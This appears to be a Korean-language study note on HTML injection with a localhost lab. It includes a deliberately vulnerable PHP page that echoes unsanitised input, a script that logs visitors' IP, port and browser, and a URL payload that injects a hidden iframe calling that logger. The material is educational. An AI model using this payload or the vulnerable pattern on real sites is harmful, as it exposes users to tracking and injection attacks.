# HTML Injection (18.07.19) #

- 취약한 매개 변수에 악의적인 HTML을 삽입해 다른 동작(공격자가 원하는 동작)이 수행하도록 공격을 하는 기법.
- XSS 나 CSRF 공격을 이해하는 데 좋은 수단

> injection : 보내지 말아야 할 코드지만 실제 보냈을 때 필터링을 통과하는 것.



###   ! Html Injection 공격 개념 ! ###
![png1](https://user-images.githubusercontent.com/40850499/43046468-5cd3a9e0-8e04-11e8-8b82-161631cc4bc5.PNG)



http에서 공격자가 악의적인 html를 주입시키게 되면, 

단순한 html 태그가 서버로 전송되어 전혀 예상 외의 결과 값이 되돌아오게 된다. 

클라이언트는 특정 이벤트를 웹 서버로 보내고 서버는 이를 처리를 해 다시 클라이언트로 보낸다.

여기서, Get 방식이나 Post 방식으로 전송을 할 때 취약점을 통해 공격이 수행 되는 것이다.



------



## 간단한 공격실습 ##

실습을 하기 위해서 autoset이 필요하다.

[autoset](http://autoset.net/xe/download_autoset_9_0_0)다운을 받고 구글링해서 설정을 해준다음 따라하기로 한다.

![png2](https://user-images.githubusercontent.com/40850499/43046477-6614606c-8e04-11e8-8fb6-613e219c731d.PNG)


실습은 브라우저 주소창에서 공격자가 url 로 ip 탈취 html를 주입하게 되면 

공격자가 클라이언트 정보를 얻게 된다는 내용이다.

먼저, C 드라이브에 있는 autoset 에 html폴더를 생성을 한 뒤

 이 실습에서 필요한 php 파일을 만든다.

![kakaotalk_20180722_230930126](https://user-images.githubusercontent.com/40850499/43046495-820f22b6-8e04-11e8-9420-9fe586bd5485.png)

 < vul.php > 

```php+HTML
<?php
    $name = $_REQUEST ['name'];
?>
<html>
	<h1>Welcome to the Internet!</h1>
	<br>
	<body>
            Hello, <?php echo $name; ?>!
	    <p>We are so glad you are here!</p>
	</body>
</html>
```

vul.php 파일은 공격이 성공이 되었을 때 브라우저에 나타 날 내용이다

name='tset' 가 Get 방식으로 변수를 전송을 하고 html 문구를 넣어 특정 php를 인식 시킨다.



<ip.php>

```php
<?PHP
$ip_address;
$ip_address = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['SERVER_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$time = time();

$log = $ip_address." , ".$port." , ".$agent." , ".$time;
$file = './log.txt';
file_put_contents($file, $log .PHP_EOL, FILE_APPEND);
?>
```

ip.php는 클라이언트의 ip , 포트, 브라우저 종류, 시간을 수집하여 서버에 로그로 기록을 해준다.



그리고 나서 log.txt 파일도 생성을 해준 뒤, 생성한 모든 파일을 html 폴더에 넣어준다.

모든 실습 준비가 되었으면 브라우저 주소창에 다음과 같이 적어준다.

```html
http://127.0.0.1/html/vul.php?name=test<iframe width=“0” height=“0” src=“http://127.0.0.1/html/ip.php”></ifame>
```

>  ifame 태그는 html 화면에 또 다른 html 창을 넣을 수 있는 태그이다.



저 url 를 치고 나면 다음과 같은 화면이 보일 것이다.

![default](https://user-images.githubusercontent.com/40850499/43046501-951068a2-8e04-11e8-918f-64af7cc8f2cf.PNG)




이 화면은 취약점 공격 화면이다

이제 html 폴더에 가서 log.txt 를 확인 해보면

![2](https://user-images.githubusercontent.com/40850499/43046503-9dea96a0-8e04-11e8-978c-9ccdc3b29349.PNG)



이렇게 접속된 클라이언트의 ip 정보와 포트, 브러우저, 시간 정보를 획득했음을 확인 할 수 있다.



이로써 저어엉말 간단한 html injection 실습이 끝났다.
